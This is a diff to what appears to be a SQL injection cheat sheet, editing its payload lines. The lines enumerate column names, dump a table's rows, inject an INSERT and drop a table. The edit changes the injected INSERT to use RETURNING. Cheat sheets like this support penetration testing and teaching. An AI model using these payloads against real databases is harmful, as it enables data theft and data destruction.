@@ -36,8 +36,8 @@ column_name [...] FROM information_schema.columns WHERE table_name = 'account';-
 -- Query from table, now knowing the columns (e.g. account):
 SELECT 1, 2, * FROM account;--
 
--- Insert into table (may require additional SELECT for queries):
-; INSERT INTO table (col1, col2) VALUES ('pwn', 1); SELECT 1, 2, * FROM table;--
+-- Insert into table (may require additional return for queries):
+; INSERT INTO table (col1, col2) VALUES ('pwn', 1) RETURNING *;--
 
 -- Drop table (may also require additional SELECT for queries):
 ; DROP TABLE table; SELECT [...] table_name [...] FROM information_schema.tables 
